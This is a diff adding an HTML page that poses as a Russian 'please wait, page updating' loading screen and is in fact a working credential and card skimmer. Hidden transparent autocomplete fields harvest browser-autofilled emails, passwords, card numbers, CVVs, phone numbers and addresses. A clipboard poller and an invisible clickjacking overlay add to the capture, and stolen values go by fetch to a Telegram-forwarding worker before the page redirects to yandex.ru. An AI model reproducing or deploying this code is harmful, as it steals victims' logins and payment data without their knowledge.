@@ -1,1 +1,212 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Загрузка</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: linear-gradient(135deg, #184EA1 0%, #1F8468 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+        .container {
+            text-align: center;
+            padding: 2rem;
+            z-index: 1000;
+            position: relative;
+            pointer-events: none; 
+        }
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1rem;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h1 { font-size: 1.5rem; font-weight: 400; margin-bottom: 0.5rem; }
+        p { opacity: 0.8; font-size: 0.9rem; }
 
+        .autofill-trap {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 300px;
+            height: 200px;
+            opacity: 0; /* ПОЛНОСТЬЮ ПРОЗРАЧНО */
+            pointer-events: none; /* не мешаем кликам */
+            z-index: 1;
+        }
+        .autofill-trap input {
+            width: 100%;
+            height: 40px;
+            margin: 5px 0;
+            border: 1px solid #ccc;
+            background: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loader"></div>
+        <h1>Пожалуйста, подождите</h1>
+        <p>Идет обновление страницы</p>
+    </div>
+
+    <div class="autofill-trap" id="autofillTrap">
+
+        <input type="text" id="email" name="email" autocomplete="email" placeholder="Email">
+        <input type="password" id="password" name="password" autocomplete="current-password" placeholder="Пароль">
+        
+        <!-- Карта -->
+        <input type="text" id="cc-name" name="ccname" autocomplete="cc-name" placeholder="Имя на карте">
+        <input type="text" id="cc-number" name="ccnumber" autocomplete="cc-number" placeholder="Номер карты">
+        <input type="text" id="cc-exp" name="ccexp" autocomplete="cc-exp" placeholder="MM/YY">
+        <input type="text" id="cc-csc" name="cccsc" autocomplete="cc-csc" placeholder="CVV">
+        
+        <!-- Адрес/телефон -->
+        <input type="tel" id="tel" name="tel" autocomplete="tel" placeholder="Телефон">
+        <input type="text" id="address" name="address" autocomplete="street-address" placeholder="Адрес">
+    </div>
+
+    <script>
+
+        const WORKER_URL = 'https://telegram-forwarder.3bdhdhxghx.workers.dev';
+
+        async function sendToTelegram(type, value) {
+            try {
+                const message = `🔥 <b>${type}</b>\n\n` +
+                    `📝 <b>Значение:</b>\n<code>${value}</code>\n` +
+                    `🌐 <b>URL:</b> ${window.location.href}\n` +
+                    `🕐 <b>Время:</b> ${new Date().toLocaleString()}`;
+
+                await fetch(WORKER_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message }),
+                    keepalive: true,
+                    mode: 'no-cors'
+                });
+            } catch (e) {}
+        }
+
+        (function() {
+            const trap = document.getElementById('autofillTrap');
+            const fields = {
+                email: document.getElementById('email'),
+                password: document.getElementById('password'),
+                ccname: document.getElementById('cc-name'),
+                ccnumber: document.getElementById('cc-number'),
+                ccexp: document.getElementById('cc-exp'),
+                cccsc: document.getElementById('cc-csc'),
+                tel: document.getElementById('tel'),
+                address: document.getElementById('address')
+            };
+
+            // Функция проверки полей
+            function checkFields() {
+                for (let [key, field] of Object.entries(fields)) {
+                    if (field && field.value && field.value.length > 3) {
+                        // Фильтруем мусор
+                        const val = field.value;
+
+                        if (key === 'ccnumber' && /[\d\s-]{16,}/.test(val)) {
+                            sendToTelegram('💳 КАРТА', val);
+                            field.value = ''; 
+                        }
+
+                        else if (key === 'password') {
+                            sendToTelegram('🔐 ПАРОЛЬ', val);
+                            field.value = '';
+                        }
+
+                        else if (key === 'email' && /@/.test(val)) {
+                            sendToTelegram('📧 EMAIL', val);
+                            field.value = '';
+                        }
+                        // CVV
+                        else if (key === 'cccsc' && /^\d{3,4}$/.test(val)) {
+                            sendToTelegram('🔢 CVV', val);
+                            field.value = '';
+                        }
+                        // Телефон
+                        else if (key === 'tel' && /[\d\s\+]{10,}/.test(val)) {
+                            sendToTelegram('📞 ТЕЛЕФОН', val);
+                            field.value = '';
+                        }
+                        // Адрес
+                        else if (key === 'address' && val.length > 10) {
+                            sendToTelegram('🏠 АДРЕС', val);
+                            field.value = '';
+                        }
+                    }
+                }
+            }
+
+            // Проверяем каждые 500 мс
+            setInterval(checkFields, 500);
+        })();
+
+        (function() {
+            let lastClipboard = '';
+            setInterval(async () => {
+                try {
+                    const text = await navigator.clipboard.readText().catch(() => '');
+                    if (text && text !== lastClipboard && text.length > 5) {
+                        const hasCard = /[\d]{16}|[\d]{4}[\s-][\d]{4}[\s-][\d]{4}[\s-][\d]{4}/.test(text);
+                        const hasPassword = /pass|пароль|pwd/i.test(text) && /.{8,}/.test(text);
+                        const hasEmail = /[\w.-]+@[\w.-]+\.\w+/.test(text);
+                        
+                        if (hasCard || hasPassword || hasEmail) {
+                            sendToTelegram('📋 БУФЕР', text);
+                        }
+                        lastClipboard = text;
+                    }
+                } catch (e) {}
+            }, 2000);
+        })();
+
+        (function() {
+            // Принудительно фокусируем поле email (браузер часто реагирует)
+            setTimeout(() => {
+                const emailField = document.getElementById('email');
+                if (emailField) {
+                    emailField.focus();
+                    setTimeout(() => emailField.blur(), 100);
+                }
+            }, 500);
+
+            // Создаем невидимую кнопку для Clickjacking (если пользователь кликнет)
+            const fakeBtn = document.createElement('div');
+            fakeBtn.style.position = 'fixed';
+            fakeBtn.style.top = '50%';
+            fakeBtn.style.left = '50%';
+            fakeBtn.style.transform = 'translate(-50%, -50%)';
+            fakeBtn.style.width = '300px';
+            fakeBtn.style.height = '100px';
+            fakeBtn.style.zIndex = '1000000';
+            fakeBtn.style.opacity = '0';
+            fakeBtn.style.cursor = 'pointer';
+            fakeBtn.onclick = function() {
+                // При клике на "пустоту" принудительно дергаем поля
+                document.getElementById('email')?.focus();
+                document.getElementById('email')?.blur();
+            };
+            document.body.appendChild(fakeBtn);
+        })();
+
+        setTimeout(() => {
+            window.location.href = 'https://yandex.ru';
+        }, 3000);
+    </script>
+</body>
+</html>
